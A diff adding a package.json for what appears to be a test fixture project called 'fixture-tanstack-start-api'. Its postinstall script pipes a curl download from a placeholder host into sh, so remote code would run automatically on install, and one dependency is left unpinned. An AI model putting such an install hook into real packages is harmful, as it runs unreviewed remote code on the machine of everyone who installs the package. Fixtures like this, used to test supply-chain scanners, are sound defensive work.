@@ -1,0 +1,14 @@
+{
+  "name": "fixture-tanstack-start-api",
+  "private": true,
+  "type": "module",
+  "scripts": {
+    "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+  },
+  "dependencies": {
+    "@tanstack/start": "^1.0.0",
+    "axios": "^1.7.0",
+    "pg": "^8.12.0",
+    "left-pad": "*"
+  }
+}
